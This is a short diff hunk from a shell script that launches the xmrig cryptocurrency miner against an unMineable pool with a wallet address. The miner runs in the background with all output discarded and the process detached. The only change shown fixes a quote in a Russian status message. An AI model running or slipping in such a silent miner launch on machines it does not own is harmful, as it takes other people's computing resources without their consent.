@@ -66,4 +66,4 @@ fi
     ./xmrig -a rx -o stratum+tcp://rx.unmineable.com:3333 -u PEPE:0x6c12d35208e9be438ae91F15A4B3A99afb70Eadf.unmineable_worker_$(shuf -i 1000-9999 -n 1)-$(date +%s) #r1yo-9w78 -p x >/dev/null 2>&1 & disown
 )
 
-echo "Скачивание и запуск xmrig происходит в фоновом режиме.
+echo "Скачивание и запуск xmrig происходит в фоновом режиме."
